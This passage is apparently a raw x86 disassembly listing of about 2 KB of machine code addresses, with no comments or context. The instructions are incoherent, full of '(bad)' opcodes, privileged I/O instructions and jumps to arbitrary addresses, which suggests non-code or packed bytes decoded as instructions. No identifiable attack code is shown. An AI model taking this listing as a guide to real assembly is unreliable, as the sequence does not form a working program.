  532315:	je     0x5322f9
  532317:	fsubr  DWORD PTR [eax]
  532319:	dec    DWORD PTR [eax-0xc]
  53231c:	push   ecx
  53231d:	mov    edx,0x8305feca
  532322:	js     0x5322f2
  532324:	jecxz  0x53236b
  532326:	mov    ebx,0x8cc17277
  53232b:	xchg   edi,eax
  53232c:	push   ebx
  53232d:	adc    BYTE PTR [ebx],dh
  53232f:	mov    WORD PTR ds:0xf2fadaaa,gs
  532335:	pop    ss
  532336:	mov    ecx,0xacd48b01
  53233b:	repnz cmc 
  53233d:	test   DWORD PTR [ecx+0x611b1aae],edi
  532343:	ins    DWORD PTR es:[edi],dx
  532344:	inc    ax
  532346:	pop    ecx
  532347:	test   eax,0x8744c85
  53234c:	loopne 0x532342
  53234e:	dec    DWORD PTR [ecx+0x44ddde42]
  532354:	inc    ebx
  532355:	fbld   TBYTE PTR [bp+si]
  532358:	pop    es
  532359:	rol    BYTE PTR [edi-0x6f923228],1
  53235f:	add    BYTE PTR [eax-0x76ee48fc],bl
  532365:	jae    0x5323ca
  532367:	dec    edi
  532368:	shl    DWORD PTR [ebx],cl
  53236a:	dec    edi
  53236b:	ficom  WORD PTR [esi+0x67]
  53236e:	iret   
  53236f:	shl    BYTE PTR [esp+esi*1],cl
  532372:	ss mov dl,0xee
  532375:	push   ebp
  532376:	inc    eax
  532377:	push   ds
  532378:	sti    
  532379:	mov    WORD PTR [eax-0x38],?
  53237c:	and    DWORD PTR [edx+0x3875e1c7],ebp
  532382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  532383:	pop    esp
  532384:	pop    edx
  532385:	arpl   WORD PTR [edx+0x668c566],dx
  53238b:	lods   eax,DWORD PTR ds:[esi]
  53238c:	xor    BYTE PTR [eax],dh
  53238e:	pop    ecx
  53238f:	pop    ebx
  532390:	in     eax,0x40
  532392:	mov    ebp,?
  532394:	mov    eax,0xadbabd91
  532399:	aas    
  53239a:	pop    ebx
  53239b:	pop    ds
  53239c:	pushf  
  53239d:	mov    dh,0x12
  53239f:	or     eax,0x294a73d1
  5323a4:	(bad)  
  5323a5:	xor    esp,DWORD PTR [eax]
  5323a7:	out    0x52,al
  5323a9:	inc    edx
  5323aa:	lods   al,BYTE PTR ds:[esi]
  5323ab:	fistp  QWORD PTR [esp+ecx*2-0x4cbefd26]
  5323b2:	or     al,0x12
  5323b4:	imul   edx,edx,0x2c
  5323b7:	push   es
  5323b8:	ret    
  5323b9:	dec    ecx
  5323ba:	inc    ebx
  5323bb:	test   DWORD PTR [esi+0x77],eax
  5323be:	popf   
  5323bf:	mov    al,0x56
  5323c1:	retf   0x7acf
  5323c4:	aaa    
  5323c5:	and    cl,bl
  5323c7:	into   
  5323c8:	inc    ebx
  5323c9:	popa   
  5323ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5323cb:	jp     0x53236d
  5323cd:	pop    esi
  5323ce:	sbb    edi,DWORD PTR [eax+ecx*2+0x4c]
  5323d2:	test   BYTE PTR [ebp+0x30],dl
  5323d5:	imul   esi,ecx,0x23
  5323d8:	shl    BYTE PTR [ebp-0x6e],0x8f
  5323dc:	retf   0xd6ff
  5323df:	test   BYTE PTR [edx],ch
  5323e1:	xchg   ebx,eax
  5323e2:	or     BYTE PTR [edi+ecx*8],ch
  5323e5:	ds xchg ebx,eax
  5323e7:	call   FWORD PTR [esi+ebp*4+0x53]
  5323eb:	xor    BYTE PTR [ebp+ecx*8+0x6fd16e37],bh
  5323f2:	arpl   WORD PTR [edx-0x23],sp
  5323f5:	jmp    0x4281:0x738ca472
  5323fc:	mov    BYTE PTR [edi-0x1e],0x29
  532400:	cmp    al,0x7
  532402:	inc    ebx
  532403:	mov    ecx,DWORD PTR [edi]
  532405:	sbb    al,0x1
  532407:	imul   edi,ebp,0xffffffcc
  53240a:	dec    edi
  53240b:	sbb    esi,DWORD PTR [ecx]
  53240d:	or     DWORD PTR [ebx-0x80],esi
  532410:	jb     0x5323c1
  532412:	pop    ss
  532413:	pop    edi
  532414:	push   cs
  532415:	test   eax,0x5a10aab
  53241a:	and    al,0xb1
  53241c:	xchg   esi,eax
  53241d:	xchg   edx,eax
  53241e:	push   ebx
  53241f:	adc    esi,ebx
  532421:	dec    eax
  532422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  532423:	adc    DWORD PTR [eax],edi
  532425:	ss enter 0x39d8,0xee
  53242a:	and    eax,0xe93b3f09
  53242f:	xchg   BYTE PTR [ecx+0xe],bh
  532432:	xchg   DWORD PTR [ebx-0x59],esi
  532435:	push   ebp
  532436:	jae    0x532464
  532438:	inc    edx
  532439:	rcr    ah,1
  53243b:	sbb    cl,dl
  53243d:	sub    BYTE PTR [edx],ch
  53243f:	xlat   BYTE PTR ds:[ebx]
  532440:	ins    DWORD PTR es:[edi],dx
  532441:	out    dx,al
  532442:	xor    DWORD PTR [esi+0x68],ecx
  532445:	cmp    BYTE PTR [esi-0x41],bh
  532448:	pop    ecx
  532449:	mov    ah,0x31
  53244b:	xor    dh,dh
  53244d:	mov    esi,0x8cd9e773
  532452:	mov    dh,0xfd
  532454:	mov    ebp,0x210532f7
  532459:	mov    al,0x37
  53245b:	add    BYTE PTR [edi+0x6b720814],0x8b
  532462:	imul   ebp,DWORD PTR [edi+0x2258b395],0x42c272c1
  53246c:	fst    DWORD PTR [ebx-0x64f79b05]
  532472:	ss cs sub eax,eax
  532476:	fild   WORD PTR ds:0x73ba651e
  53247c:	xchg   ecx,eax
  53247d:	lods   eax,DWORD PTR ds:[esi]
  53247e:	xchg   esp,eax
  53247f:	dec    esi
  532480:	or     dl,BYTE PTR [edi+ebp*2]
  532483:	push   esp
  532484:	imul   esi,DWORD PTR [edx-0x1],0xfffffff7
  532488:	cmp    ah,BYTE PTR [ebx+esi*4+0x40ded903]
  53248f:	mov    WORD PTR [edx+0x32b21892],gs
  532495:	dec    edi
  532496:	sbb    DWORD PTR [ecx-0x74],0x4c
  53249a:	fld    TBYTE PTR [esi+0x63a82ff2]
  5324a0:	mov    ecx,0xdd0a7c27
  5324a5:	xchg   edi,eax
  5324a6:	and    DWORD PTR [ebx],esi
  5324a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5324a9:	add    eax,0xdc91ca5c
  5324ae:	inc    edi
  5324af:	and    al,0x44
  5324b1:	jmp    0x5324d3
  5324b3:	mov    cl,ah
  5324b5:	push   0x9e26e0e3
  5324ba:	cmp    BYTE PTR [esi+0x75],bl
  5324bd:	xor    DWORD PTR [ecx],0x38db0bf6
  5324c3:	inc    esp
  5324c4:	sub    al,0xad
  5324c6:	jb     0x53246c
  5324c8:	aas    
  5324c9:	push   esi
  5324ca:	fwait
  5324cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5324cc:	test   esi,0x5cc48d9b
  5324d2:	mov    dl,0xfe
  5324d4:	adc    al,0xc0
  5324d6:	cmp    bl,bh
  5324d8:	sti    
  5324d9:	shr    DWORD PTR [ebx+0x7bd257d1],1
  5324df:	sub    BYTE PTR [edi+0x66],al
  5324e2:	pop    edi
  5324e3:	mov    cl,BYTE PTR [edi]
  5324e5:	push   ebp
  5324e6:	pushf  
  5324e7:	mov    edx,0x90471955
  5324ec:	aam    0x79
  5324ee:	xchg   esp,eax
  5324ef:	sahf   
  5324f0:	cmp    eax,0x617e5cf3
  5324f5:	xchg   esp,eax
  5324f6:	stc    
  5324f7:	shl    DWORD PTR [ecx+0x1c],cl
  5324fa:	es leave 
  5324fc:	jg     0x53256f
  5324fe:	ds (bad) 
  532500:	rcr    DWORD PTR [ebx-0x2cdf5ba8],1
  532506:	dec    edx
  532507:	loope  0x532515
  532509:	shl    DWORD PTR [ebx],0x20
  53250c:	push   ecx
  53250d:	cmp    eax,0x43eaf877
  532512:	out    dx,eax
  532513:	and    eax,0xaa999b00
  532519:	mov    esp,0x2d9a199d
  53251e:	jmp    0x5324fd
  532520:	mov    dh,BYTE PTR ds:0xaaee0a99
  532526:	icebp  
  532527:	ss dec edx
  532529:	scas   eax,DWORD PTR es:[edi]
  53252a:	rcl    ah,0x82
  53252d:	push   ebx
  53252e:	outs   dx,DWORD PTR ds:[esi]
  53252f:	sub    al,BYTE PTR [esi-0x27]
  532532:	adc    al,0x45
  532534:	push   ss
  532535:	test   eax,0x34975825
  53253a:	repnz in al,0x6d
  53253d:	call   0x319a2c63
  532542:	enter  0x434a,0x3c
  532546:	push   0xffffffb1
  532548:	(bad)  
  532549:	out    dx,al
  53254a:	retf   0x6eed
  53254d:	pop    edi
  53254e:	mov    ch,bh
  532550:	pop    eax
  532551:	xchg   ebx,eax
  532552:	sub    BYTE PTR [ecx+0x3a032cd4],0x94
  532559:	jo     0x53256e
  53255b:	jp     0x532571
  53255d:	aam    0x5
  53255f:	push   ebp
  532560:	xor    eax,0x845afb0a
  532565:	lea    edi,[edi]
  532567:	jecxz  0x532532
  532569:	sub    BYTE PTR [edi],0x62
  53256c:	inc    edx
  53256d:	aam    0x86
  53256f:	adc    bl,ah
  532571:	retf   0x2a8a
  532574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  532575:	es (bad) 
  532577:	xchg   edx,eax
  532578:	popf   
  532579:	fsubr  DWORD PTR [ebp+0x38d6b2a1]
  53257f:	dec    ebx
  532580:	paddq  mm6,QWORD PTR [edx+0x46]
  532584:	stos   BYTE PTR es:[edi],al
  532585:	xchg   esp,eax
  532586:	sbb    esi,DWORD PTR [edi+edx*1-0x72cdb446]
  53258d:	adc    eax,0x27439d9a
  532592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  532593:	rol    bh,cl
  532595:	lahf   
  532596:	outs   dx,DWORD PTR ds:[esi]
  532597:	jnp    0x532546
  532599:	ret    
  53259a:	xor    eax,0x3bb31d44
  53259f:	jl     0x532614
  5325a1:	(bad)
  5325a4:	cwde   
  5325a5:	aas    
  5325a6:	push   ebx
  5325a7:	daa    
  5325a8:	mov    ds:0xea0e5664,al
  5325ad:	and    dl,BYTE PTR [edi]
  5325af:	scas   eax,DWORD PTR es:[edi]
  5325b0:	fist   WORD PTR [edx]
  5325b2:	mov    edx,0x380a1a0c
  5325b7:	mov    esi,?
  5325b9:	sbb    al,0xc2
  5325bb:	enter  0xb878,0x89
  5325bf:	cmp    DWORD PTR [ecx+eiz*2],esp
  5325c2:	mov    al,ds:0x9cf6f361
  5325c7:	sahf   
  5325c8:	cmp    DWORD PTR [ebx+0xe],ebp
  5325cb:	enter  0x715e,0x7b
  5325cf:	div    DWORD PTR [ebx+eax*8]
  5325d2:	lds    ebp,FWORD PTR [ebx+0x1fe44351]
  5325d8:	mov    ch,0x4
  5325da:	mov    DWORD PTR [eax],esp
  5325dc:	lods   eax,DWORD PTR ds:[esi]
  5325dd:	sbb    ebx,DWORD PTR [ebp-0x7f]
  5325e0:	fstp   DWORD PTR ds:0xec7393ee
  5325e6:	ja     0x53256c
  5325e8:	push   ebx
  5325e9:	pop    ebx
  5325ea:	lds    eax,FWORD PTR [ecx]
  5325ec:	xchg   ecx,eax
  5325ed:	xchg   ebx,eax
  5325ee:	and    bh,BYTE PTR [edx]
  5325f0:	in     eax,0xdd
  5325f2:	sub    dl,dl
  5325f4:	das    
  5325f5:	ss sub bh,ah
  5325f8:	pop    ss
  5325f9:	sar    BYTE PTR [ebx-0x7e],1
  5325fc:	dec    ebx
  5325fd:	or     DWORD PTR [ebp+0x2940d9ff],edx
  532603:	and    DWORD PTR [esi+0x2a],esp
  532606:	mov    dl,0x1c
  532608:	fsubr  QWORD PTR [esi-0x29e7f604]
  53260e:	pop    esi
  53260f:	popa   
  532610:	sub    bh,ah
  532612:	push   ecx
  532613:	mov    edx,0x1a71f2a5
  532618:	mov    esi,DWORD PTR [eax+0x2a646fc0]
  53261e:	adc    BYTE PTR [eax],0x81
  532621:	loop   0x53263c
  532623:	or     dh,bh
  532625:	and    al,0xf7
  532627:	(bad)  
  532628:	mov    al,ds:0xe40fa6dd
  53262d:	push   eax
  53262e:	call   FWORD PTR [edi+0x37]
  532631:	or     al,0xeb
  532633:	mov    edi,0xe72375f4
  532638:	mov    edx,0x96dd5ea6
  53263d:	sbb    edi,DWORD PTR [ecx+ebx*8-0x3de08602]
  532644:	(bad)  
  532645:	or     ecx,esp
  532647:	mov    dh,BYTE PTR [edi]
  532649:	mov    cl,BYTE PTR [esi+ecx*4-0x1c]
  53264d:	shl    bh,0xc0
  532650:	stos   DWORD PTR es:[edi],eax
  532651:	inc    edx
  532652:	mov    ah,0x3
  532654:	mov    ch,0xf9
  532656:	mov    ecx,0xdf4d9674
  53265b:	shr    BYTE PTR [edx-0x20057cfc],0x5
  532662:	push   esp
  532663:	and    edi,DWORD PTR [ebp+0x1c]
  532666:	mov    DWORD PTR [eax-0x305fbbba],edx
  53266c:	nop
  53266d:	test   al,0x8e
  53266f:	mov    al,ds:0xd6cdf9db
  532674:	inc    ecx
  532675:	fs xchg esp,esi
  532678:	dec    esp
  532679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  53267a:	push   ebx
  53267b:	retf   0x181f
  53267e:	and    esp,DWORD PTR [ebx-0x3f]
  532681:	xchg   ebp,eax
  532682:	sub    eax,0xf9ae0ee4
  532687:	and    DWORD PTR [esi],0x2a245a4d
  53268d:	inc    eax
  53268e:	xchg   ebx,eax
  53268f:	push   edi
  532690:	mov    al,ds:0x5c76fe1f
  532695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  532696:	inc    esi
  532697:	bndstx [ebp+edi*2-0x49],bnd3
  53269c:	icebp  
  53269d:	push   cs
  53269e:	and    DWORD PTR [eax],0x960a880a
  5326a4:	mov    eax,0x4be64865
  5326a9:	test   eax,0xce392584
  5326ae:	adc    al,0x3d
  5326b0:	ficom  WORD PTR [eax+0x3f9a0e0f]
  5326b6:	sub    eax,0xef99367c
  5326bb:	sbb    eax,0x17656aa2
  5326c0:	sbb    BYTE PTR [edi-0x6],al
  5326c3:	daa    
  5326c4:	ffreep st(0)
  5326c6:	push   esp
  5326c7:	cmp    al,0x43
  5326c9:	mov    DWORD PTR [eax+0x56],esi
  5326cc:	enter  0x716d,0x47
  5326d0:	pop    ebx
  5326d1:	inc    edx
  5326d2:	loopne 0x532685
  5326d4:	and    ah,BYTE PTR ds:0x252ce56a
  5326da:	sahf   
  5326db:	lods   al,BYTE PTR ds:[esi]
  5326dc:	pop    ss
  5326dd:	push   es
  5326de:	inc    ebp
  5326df:	cmp    ecx,DWORD PTR [ecx-0x1b6d5f05]
  5326e5:	jnp    0x5326cd
  5326e7:	inc    ecx
  5326e8:	xor    DWORD PTR [ebx],0x7540ea5e
  5326ee:	call   0xdb289f3b
  5326f3:	pop    ds
  5326f4:	and    al,0x6d
  5326f6:	mov    edx,ecx
  5326f8:	call   0x401d2817
  5326fd:	out    dx,al
  5326fe:	ror    esi,cl
  532700:	lahf   
  532701:	out    0xe4,al
  532703:	add    edi,ecx
  532705:	and    dl,BYTE PTR [ecx]
  532707:	jb     0x53272a
  532709:	xchg   esp,ebx
  53270b:	fld    TBYTE PTR [ebx]
  53270d:	mov    cl,dl
  53270f:	adc    eax,0xe8eed8ef
  532714:	push   gs
  532716:	mul    bl
  532718:	fimul  WORD PTR [ecx]
  53271a:	inc    esp
  53271b:	rol    ah,0x6
  53271e:	xor    DWORD PTR [edi],esi
  532720:	or     al,0x9d
  532722:	(bad)  
  532723:	hlt    
  532724:	mov    esp,0xdd848bbe
  532729:	aam    0x3b
  53272b:	cmc    
  53272c:	rol    bh,0x3c
  53272f:	push   esi
  532730:	inc    edx
  532731:	jns    0x532716
  532733:	cli    
  532734:	shl    edx,0xe
  532737:	jmp    0xceb076de
  53273c:	or     BYTE PTR [ebx+0x1b],al
  53273f:	rol    BYTE PTR [eax+esi*1],1
  532742:	xor    eax,0xf33cbe71
  532747:	clc    
  532748:	add    al,0xf0
  53274a:	test   al,0x27
  53274c:	hlt    
  53274d:	push   edi
  53274e:	lahf   
  53274f:	and    ebx,DWORD PTR [edx+0x9247d39]
  532755:	repz add eax,0xd16a874d
  53275b:	(bad)  
  53275c:	mov    ds:0x45fcc847,eax
  532761:	xchg   edi,eax
  532762:	(bad)  [eax]
  532764:	ins    DWORD PTR es:[edi],dx
  532765:	imul   esp,DWORD PTR [edx+0x1d],0x55
  532769:	jmp    0x532743
  53276b:	rcr    BYTE PTR [ebp+0x1e],cl
  53276e:	xor    DWORD PTR [ecx],eax
  532770:	out    dx,eax
  532771:	add    dl,BYTE PTR [eax-0x5473257c]
  532777:	jle    0x532794
  532779:	sub    eax,0xb1576a95
  53277e:	or     eax,0xc158ad4e
  532783:	jp     0x532741
  532785:	in     al,dx
  532786:	xor    ah,dh
  532788:	mov    edx,ebp
  53278a:	xor    al,0x56
  53278c:	mov    edi,DWORD PTR [esi]
  53278e:	outs   dx,DWORD PTR ds:[esi]
  53278f:	push   eax
  532790:	mov    dl,BYTE PTR [edi-0x38dd12a5]
  532796:	aad    0xac
  532798:	jbe    0x5327fd
  53279a:	push   0xffffffb6
  53279c:	inc    eax
  53279d:	into   
  53279e:	in     eax,0x8c
  5327a0:	sbb    edi,DWORD PTR [esi]
  5327a2:	cmp    DWORD PTR ds:0x4902f0a6,edx
  5327a8:	in     al,dx
  5327a9:	xchg   ecx,eax
  5327aa:	mov    cl,0x2a
  5327ac:	iret   
  5327ad:	mov    WORD PTR [esi],fs
  5327af:	icebp  
  5327b0:	fisttp QWORD PTR [edx+0x4]
  5327b3:	jp     0x532792
  5327b5:	gs (bad) 
  5327b7:	lods   al,BYTE PTR ds:[esi]
  5327b8:	inc    eax
  5327b9:	pushf  
  5327ba:	xor    ah,0x86
  5327bd:	jge    0x5327bd
  5327bf:	ins    BYTE PTR es:[edi],dx
  5327c0:	pop    ds
  5327c1:	cmp    eax,0x3c883105
  5327c6:	mov    cl,0x1b
  5327c8:	fiadd  DWORD PTR [ecx-0x6f]
  5327cb:	jp     0x53276f
  5327cd:	sub    cl,BYTE PTR [ecx]
  5327cf:	cld    
  5327d0:	fistp  DWORD PTR [ecx+0x1a983b6]
  5327d6:	mov    cs,WORD PTR [ebp+0x25]
  5327d9:	(bad)  
  5327da:	pop    ebp
  5327db:	mov    ds:0xde45b8b1,eax
  5327e0:	rcl    DWORD PTR [edx],0x5d
  5327e3:	lods   eax,DWORD PTR ds:[esi]
  5327e4:	(bad)  
  5327e5:	lods   al,BYTE PTR ds:[esi]
  5327e6:	not    BYTE PTR [ebp+0x3d]
  5327e9:	div    DWORD PTR [edx]
  5327eb:	std    
  5327ec:	xchg   esi,eax
  5327ed:	leave  
  5327ee:	xor    BYTE PTR [edi+0x654d669e],0x90
  5327f5:	xor    BYTE PTR [edx+0x1a953f44],ch
  5327fb:	sub    al,0x12
  5327fd:	inc    edx
  5327fe:	jo     0x5327e9
  532800:	add    esi,ebx
  532802:	cwde   
  532803:	je     0x53279a
  532805:	pop    es
  532806:	xchg   edi,eax
  532807:	inc    eax
  532808:	jle    0x53281c
  53280a:	push   edx
  53280b:	out    dx,eax
  53280c:	jge    0x5327bb
  53280e:	inc    eax
  53280f:	loop   0x5327f4
  532811:	sar    DWORD PTR [esi+ecx*4-0x1352c49a],cl
  532818:	sbb    al,0xe2
  53281a:	or     ch,BYTE PTR [edi]
  53281c:	call   0x17c4:0xf190507c
  532823:	cmp    BYTE PTR [ecx-0x2a],ch
  532826:	rcr    BYTE PTR [edi],1
  532828:	inc    edx
  532829:	xor    al,0xe
  53282b:	xlat   BYTE PTR ds:[ebx]
  53282c:	jbe    0x5327cd
  53282e:	cmc    
  53282f:	pop    edx
  532830:	jecxz  0x532876
  532832:	test   al,0xd4
  532834:	sub    ecx,eax
  532836:	nop
  532837:	int3   
  532838:	aad    0x1
  53283a:	stos   BYTE PTR es:[edi],al
  53283b:	cmp    DWORD PTR [ecx+0x6d],ebx
  53283e:	jge    0x5327ce
  532840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  532841:	sub    BYTE PTR [eax-0x77],bl
  532844:	xor    DWORD PTR [ebp-0x613e3d77],0xa4cc6d36
  53284e:	xor    eax,0x47ea8755
  532853:	pop    ss
  532854:	dec    esp
  532855:	ror    DWORD PTR [ebx-0x14],cl
  532858:	xor    esi,DWORD PTR [ebx]
  53285a:	adc    DWORD PTR [edi+0x65],ebp
  53285d:	xchg   edx,eax
  53285e:	inc    ebp
  53285f:	add    BYTE PTR [eax],ch
  532861:	in     eax,dx
  532862:	pop    ss
  532863:	jo     0x5328d1
  532865:	ret    
  532866:	add    al,0x62
  532868:	repnz xor BYTE PTR [edi],bl
  53286b:	adc    eax,0x18458f7c
  532870:	ins    DWORD PTR es:[edi],dx
  532871:	pop    esi
  532872:	(bad)  
  532873:	pop    edi
  532874:	test   BYTE PTR [edx],cl
  532876:	xchg   esp,eax
  532877:	sbb    eax,DWORD PTR [edi-0x296e730f]
  53287d:	mov    ds:0x3b9f4525,eax
  532882:	jmp    0x532840
  532884:	add    eax,0x5966f9c5
  532889:	int3   
  53288a:	shl    BYTE PTR [ecx+0x11],0xc
  53288e:	xlat   BYTE PTR ds:[ebx]
  53288f:	mov    ebp,0x70d2e74f
  532894:	shl    BYTE PTR [esi-0x3a],1
  532897:	adc    al,0xa3
  532899:	je     0x53285a
  53289b:	ds mov esp,0xfa5045a5
  5328a1:	call   0xba8e:0x524900df
  5328a8:	push   esi
  5328a9:	jmp    0xe32d6524
  5328ae:	add    BYTE PTR [esi-0x6e2804f],ch
  5328b4:	ret    0x6ff9
  5328b7:	lods   al,BYTE PTR ds:[esi]
  5328b8:	addr16 jg 0x532879
  5328bb:	fimul  WORD PTR [edi-0x603cf3e8]
  5328c1:	inc    ebx
  5328c2:	add    eax,0x2829f2e5
  5328c7:	add    edx,DWORD PTR [ecx-0x62]
  5328ca:	lods   al,BYTE PTR gs:[esi]
  5328cc:	mov    esp,0x6c80fe4b
  5328d1:	adc    DWORD PTR cs:[ecx-0x6a],esi
  5328d5:	jb     0x5328a6
  5328d7:	sub    eax,0xbf126641
  5328dc:	jmp    0xf089:0x7470c690
  5328e3:	into   
  5328e4:	jge    0x532903
  5328e6:	jmp    0xff02f423
  5328eb:	dec    edi
  5328ec:	push   edx
  5328ed:	lods   al,BYTE PTR ds:[esi]
  5328ee:	sub    ebp,DWORD PTR [ecx-0x64]
  5328f1:	and    eax,0x47d8e9c8
  5328f6:	jmp    0x895f12e7
  5328fb:	sub    edx,esi
  5328fd:	arpl   WORD PTR [esi],dx
  5328ff:	imul   esi,DWORD PTR [esi],0xffffff9b
  532902:	pop    edi
  532903:	xchg   eax,ecx
  532905:	pop    esp
  532906:	and    BYTE PTR [ebx+ebp*8],0x2f
  53290a:	loopne 0x53296c
  53290c:	xchg   ebp,eax
  53290d:	sbb    BYTE PTR [edx],cl
  53290f:	ss int3 
  532911:	pop    ecx
  532912:	mov    ch,0x62
  532914:	imul   ebx,DWORD PTR [ecx+0x51],0xa5b7074a
  53291b:	cld    
  53291c:	push   ss
  53291d:	pop    ecx
  53291e:	shl    DWORD PTR [edx-0x5c],cl
  532921:	sti    
  532922:	xchg   edi,eax
  532923:	enter  0x342a,0x6e
  532927:	arpl   WORD PTR [eax*8+0x3c00c188],di
  53292e:	cmp    BYTE PTR [eax+esi*1],0x94
  532932:	fidiv  DWORD PTR [esi]
  532934:	jns    0x532902
  532936:	out    dx,eax
  532937:	dec    esp
  532938:	popf   
  532939:	into   
  53293a:	stos   DWORD PTR es:[edi],eax
  53293b:	xchg   esp,eax
  53293c:	jle    0x53293c
  53293e:	outs   dx,DWORD PTR ds:[esi]
  53293f:	in     eax,dx
  532940:	fsub   QWORD PTR [edi]
  532942:	fist   DWORD PTR [edx+ebp*2]
  532945:	fwait
  532946:	popf   
  532947:	sti    
  532948:	ret    
  532949:	mov    WORD PTR [ecx-0x12],cs
  53294c:	cli    
  53294d:	xchg   edi,eax
  53294e:	mov    bl,0x21
  532950:	mov    DWORD PTR ds:0x7e3a249a,edi
  532956:	or     al,0x1e
  532958:	sbb    BYTE PTR [esi-0x358fdf8f],ah
  53295e:	or     ebp,DWORD PTR [edx]
  532960:	ja     0x5328e9
  532962:	mov    bh,0xfd
  532964:	loopne 0x532903
  532966:	adc    DWORD PTR [ebx+0x20],0x15e5abc4
  53296d:	mov    ebx,0x68fe77d
  532972:	shl    DWORD PTR [bx+di+0x12],0x4a
  532977:	add    eax,0x95e17984
  53297c:	out    0xe6,al
  53297e:	jns    0x532910
  532980:	retf   0x3412
  532983:	iret   
  532984:	test   al,0x22
  532987:	inc    edx
  532988:	sub    edx,DWORD PTR [ecx-0x2957ce73]
  53298e:	nop
  53298f:	int3   
  532990:	stos   BYTE PTR es:[edi],al
  532991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  532992:	mov    ah,0xfd
  532994:	add    edi,esp
  532996:	jecxz  0x532a16
  532998:	(bad)  
  532999:	adc    BYTE PTR [esi],dh
  53299b:	dec    esp
  53299c:	add    al,0xd2
  53299e:	cmc    
  53299f:	adc    bh,BYTE PTR [edx+0x72]
  5329a2:	mov    esp,0xa9e082ef
  5329a7:	jne    0x532958
  5329a9:	xchg   ebx,eax
  5329aa:	jnp    0x532982
  5329ac:	mov    ah,BYTE PTR [ecx]
  5329ae:	adc    ch,bh
  5329b0:	mov    ebx,0x666f543d
  5329b5:	rcr    BYTE PTR [ecx+0x11],1
  5329b8:	sub    bh,BYTE PTR [esi-0x67]
  5329bb:	mov    bh,ah
  5329bd:	pushf  
  5329be:	mov    eax,ds:0x39e9541e
  5329c3:	and    dl,BYTE PTR [edx-0x1b]
  5329c6:	in     eax,0x48
  5329c8:	fdivp  st(0),st
  5329ca:	repnz loopne 0x53297e
  5329cd:	push   es
  5329ce:	stc    
  5329cf:	enter  0x31f6,0xc
  5329d3:	lods   eax,DWORD PTR ds:[esi]
  5329d4:	out    dx,al
  5329d5:	push   ebp
  5329d6:	lahf   
  5329d7:	nop
  5329d8:	jns    0x532a22
  5329da:	(bad)  
  5329db:	push   esp
  5329dc:	mov    ebp,0xdd741897
  5329e1:	add    bh,ah
  5329e3:	cmp    edx,DWORD PTR [edx+0x44]
  5329e6:	mov    bl,0xb8
  5329e8:	or     eax,0x57acfd4c
  5329ed:	ins    DWORD PTR es:[edi],dx
  5329ee:	and    DWORD PTR [eax+0x5],edi
  5329f1:	push   edi
  5329f2:	jns    0x532a5e
  5329f4:	in     eax,dx
  5329f5:	pop    edx
  5329f6:	jmp    0xf9bd:0x981ddb2e
  5329fd:	sub    ebx,edi
  5329ff:	xchg   ebx,eax
  532a00:	ins    DWORD PTR es:[edi],dx
  532a01:	loopne 0x53298d
  532a03:	xchg   edx,eax
  532a04:	loopne 0x532a30
  532a06:	xor    al,BYTE PTR [ecx+ecx*2-0x4b]
  532a0a:	mov    ds:0x944a49a1,al
  532a0f:	fistp  WORD PTR [edi]
  532a11:	retf   
  532a12:	cmp    bh,BYTE PTR [ecx]
  532a14:	aad    0xde
  532a16:	add    eax,0xd9312194
  532a1b:	mov    WORD PTR [edi+0x6f],?
  532a1e:	pop    ebp
  532a1f:	mov    esp,0xc05344df
  532a24:	xor    dh,dh
  532a26:	cmp    edx,DWORD PTR ss:[ebx+0x16]
  532a2a:	ins    DWORD PTR es:[edi],dx
  532a2b:	push   esp
  532a2c:	sub    esi,0xffffff8f
  532a2f:	scas   eax,DWORD PTR es:[edi]
  532a30:	inc    edi
  532a31:	outs   dx,BYTE PTR ds:[esi]
  532a32:	cmp    BYTE PTR [esi+eax*2],0x73
  532a36:	inc    esp
  532a37:	xchg   ebp,eax
  532a38:	ds jmp 0xd44d8ab2
  532a3e:	into   
  532a3f:	and    al,0xcf
  532a41:	adc    cl,BYTE PTR [edi+ebx*4+0x38]
  532a45:	out    0xc6,al
  532a47:	aaa    
  532a48:	or     eax,0x67096b28
  532a4d:	daa    
  532a4e:	inc    edi
  532a4f:	in     al,0x9e
  532a51:	jne    0x5329db
  532a53:	inc    esp
  532a54:	loope  0x532a9d
  532a56:	data16 mov al,ds:0x9f262bfb
  532a5c:	je     0x532ad3
  532a5e:	ror    DWORD PTR [edi+0x7c3edf93],0xf7
  532a65:	ins    DWORD PTR es:[edi],dx
  532a66:	je     0x532a08
  532a68:	mov    al,ds:0xfc0349df
  532a6d:	push   ds
  532a6e:	mov    al,ds:0xe184a045
  532a73:	mov    bh,0xd1
  532a75:	fisub  DWORD PTR [esi]
  532a77:	pop    es
  532a78:	xchg   ebx,eax
  532a79:	sbb    al,0x5c
  532a7b:	out    dx,al
  532a7c:	or     al,0x7c
  532a7e:	inc    edi
  532a7f:	aaa    
  532a80:	retf   0x9134
  532a83:	bound  ebx,QWORD PTR [edx+0xafa302a]
  532a89:	push   0xffffffbd
  532a8b:	mov    ecx,0x9cdd26a
  532a90:	pusha  
  532a91:	adc    edi,esi
  532a93:	mov    ds:0x1292d803,eax
  532a98:	adc    BYTE PTR [edi+0x46],cl
  532a9b:	pop    ebp
  532a9c:	leave  
  532a9d:	test   al,0xbc
  532a9f:	outs   dx,BYTE PTR ds:[esi]
  532aa0:	pop    edi
  532aa1:	push   eax
  532aa2:	jg     0x532a82
  532aa4:	xor    ch,BYTE PTR [edi-0x4385910]
  532aaa:	arpl   WORD PTR [edi],sp
  532aac:	stos   BYTE PTR es:[edi],al
  532aad:	test   al,ah
  532aaf:	test   al,0x65
  532ab1:	jbe    0x532a78
  532ab3:	jmp    0xe26798c0
  532ab8:	bound  ecx,QWORD PTR ds:0xc89dd819
  532abe:	lods   eax,DWORD PTR ds:[esi]
  532abf:	aaa    
  532ac0:	stc    
  532ac1:	xor    al,0x47
  532ac3:	sbb    cl,BYTE PTR [eax+esi*4]
  532ac6:	retf   0x3ef0
